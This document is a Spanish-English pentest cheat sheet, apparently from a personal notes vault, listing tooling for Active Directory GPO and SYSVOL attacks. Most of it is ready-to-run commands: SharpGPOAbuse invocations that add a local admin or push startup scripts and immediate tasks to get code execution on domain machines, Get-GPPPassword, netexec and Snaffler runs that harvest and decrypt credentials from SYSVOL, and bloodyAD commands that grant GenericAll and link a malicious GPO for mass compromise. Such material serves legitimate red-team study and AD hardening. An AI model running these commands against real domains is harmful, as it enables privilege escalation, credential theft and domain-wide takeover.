---
aliases:
  - GPO Tooling
  - SharpGPOAbuse
  - Get-GPPPassword
  - Snaffler
tags:
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD - GPO y SYSVOL Enumeration]]"
  - "[[netexec]]"
---
# AD - GPO y SYSVOL Enumeration - Tooling

---

## RSAT / PowerShell

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-GPO -All` | All GPOs | Standard. |
| `Get-GPOReport -All -ReportType Xml -Path gpos.xml` | Bulk XML | Audit. |
| `Get-GPOReport -Name <GPO> -ReportType Html -Path gpo.html` | Per-GPO HTML | Detail. |
| `Get-GPInheritance -Target "<OU-DN>"` | GPO inheritance | Per-OU. |
| `Get-GPPermission -Guid <GPO-GUID> -All` | DACL del GPO | ACL audit. |
| `Get-GPRegistryValue -Name <GPO> -Key "HKLM\..."` | Specific reg setting | Granular. |
| `Get-GPResultantSetOfPolicy -ReportType Html -Path rsop.html -User <u> -Computer <c>` | RSoP modeling | Predict. |
| `gpresult /H rsop.html` | RSoP per-host | Standard. |
^ad-gpotool-rsat

---

## PowerView (Adversary)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-DomainGPO` | All GPOs (sin RSAT-GPO) | Quick. |
| `Get-DomainGPO -Identity <GPO>` | Per-GPO detail | Targeted. |
| `Get-DomainOU -Pr gPLink` | OUs con GPO links | Standard. |
| `Get-DomainGPOLocalGroup` | GPOs que modifican local groups | Privesc surface. |
| `Get-DomainGPOComputerLocalGroupMapping` | Computer → local group via GPO | Lateral. |
| `Get-DomainGPOUserLocalGroupMapping -Identity <user>` | User effective local admin via GPO | Path. |
| `Get-DomainPolicy -Source DC` | DC default policy | Adjacent. |
^ad-gpotool-powerview

---

## BloodHound / SharpHound

| **Comando / Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `SharpHound.exe -c All` | Includes GPO edges | Standard. |
| `bloodhound-python -d corp.local -u u -p p -ns <DC> -c All --zip` | Linux | Linux. |
| `MATCH (g:GPO)-[:GpLink]->(o:OU) RETURN g,o` | GPO → OU links | Standard. |
| `MATCH (u)-[:GenericAll\|GenericWrite\|WriteDacl\|WriteOwner]->(g:GPO) RETURN u,g` | Privesc surface modify GPO | Critical. |
| `MATCH p=(u {owned:true})-[*1..]->(g:GPO)-[:GpLink]->(o:OU)-[:Contains]->(c:Computer {highvalue:true}) RETURN p` | Mass compromise path | Critical. |
^ad-gpotool-bh

---

## SharpGPOAbuse (Privesc)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `SharpGPOAbuse.exe --AddUserRights --UserRights "SeDebugPrivilege" --GPOName "<GPO>" --UserAccount <atacante>` | Add user rights via GPO | Privesc. |
| `SharpGPOAbuse.exe --AddComputerScript --ScriptName "evil.bat" --ScriptContents "..." --GPOName "<GPO>"` | Add startup script | RCE en members. |
| `SharpGPOAbuse.exe --AddUserScript ...` | User logon script | Per-user. |
| `SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <atacante> --GPOName "<GPO>"` | Add local admin via GPO | Lateral. |
| `SharpGPOAbuse.exe --AddImmediateTask --TaskName "EvilTask" --Author "corp\u" --Command "powershell.exe" --Arguments "-c <payload>" --GPOName "<GPO>"` | Scheduled task immediate | Fast trigger. |
^ad-gpotool-sharpgpoabuse

```cmd
:: Workflow standard
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount corp\atacante --GPOName "Default Domain Policy"

:: Force gpupdate en victims (si tenés acceso)
gpupdate /force

:: Verify
nxc smb <target> -u corp\atacante -p pass --local-auth
```

---

## netexec / crackmapexec

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <DC> -u u -p p --gpo` | GPO inventory via netexec | Quick. |
| `nxc smb <DC> -u u -p p -M gpp_password` | GPP cpassword auto-decrypt | Cred hunt. |
| `nxc smb <DC> -u u -p p -M gpp_autologin` | GPP autologin creds | Adjacent. |
| `nxc smb <DC> -u u -p p -M spider_plus -o INTERESTING_EXTENSIONS=xml,ini,bat,ps1,vbs` | Spider SYSVOL | Cred hunt. |
^ad-gpotool-netexec

---

## Get-GPPPassword (PowerSploit)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-GPPPassword` | Auto-search + decrypt cpassword en SYSVOL | Native PS. |
| `Get-GPPPassword -Domain corp.local` | Cross-domain | Multi-domain. |
| `Get-GPPAutologon` | Auto-login GPP creds | Adjacent. |
^ad-gpotool-getgpp

---

## Snaffler (Auto-Discovery)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Snaffler.exe -s -u -t \\<DC>\sysvol -y` | Comprehensive cred hunt en SYSVOL | Standard. |
| `Snaffler.exe -d corp.local -m` | Multi-share + maximum recon | Bulk. |
| `Snaffler.exe -s -u -o snaffler.log` | Output a log | Reportable. |
^ad-gpotool-snaffler

```cmd
:: Snaffler standard
Snaffler.exe -s -u -t \\<DC>\sysvol -o snaffler.log

:: Output: matches por categoría (cpassword, secrets, configs, etc)
```

---

## bloodyAD (Linux)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `bloodyAD --host <DC> -d corp -u u -p pass get search "(objectClass=groupPolicyContainer)" --resolve-sd` | GPO con DACL | Linux. |
| `bloodyAD --host <DC> -d corp -u u -p pass add genericAll <GPO-DN> <atacante>` | Privesc setup | Privesc. |
| `bloodyAD ... set object <OU-DN> gPLink "[LDAP://CN={GUID},...;0]"` | Link malicious GPO | Mass compromise. |
^ad-gpotool-bloodyad

---

## Linux SMB Tools

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `smbclient //<DC>/SYSVOL -U 'corp/u%pass'` | Interactive shell | Browse. |
| `smbmap -H <DC> -u u -p pass -R --depth 5 SYSVOL` | Recursive listing | Standard. |
| `smbmap -H <DC> -u u -p pass -R -A '\.xml$\|\.ini$' SYSVOL` | Pattern match | Cred hunt. |
| `mount -t cifs //<DC>/SYSVOL /mnt/sysvol -o user=u,pass=pass,dom=corp` | Linux mount | grep-friendly. |
| `manspider /mnt/sysvol --search "password|cpassword" --content` | Linux Snaffler-like | Comprehensive. |
^ad-gpotool-linuxsmb

---

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| SharpGPOAbuse | `https://github.com/FSecureLABS/SharpGPOAbuse` |
| Snaffler | `https://github.com/SnaffCon/Snaffler` |
| PowerSploit Get-GPPPassword | `https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1` |
| HackTricks GPO Abuse | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/grouppolicypreferences` |
| The Hacker Recipes — Group Policy | `https://www.thehacker.recipes/ad/movement/group-policy` |
| MS14-025 KB | `https://support.microsoft.com/help/2962486` |
| MS-GPPREF spec (cpassword AES key público) | `https://learn.microsoft.com/openspecs/windows_protocols/ms-gppref/` |
| MITRE ATT&CK T1484.001 | `https://attack.mitre.org/techniques/T1484/001/` |
| MITRE ATT&CK T1552.006 (GPP) | `https://attack.mitre.org/techniques/T1552/006/` |
^ad-gpotool-resources

---
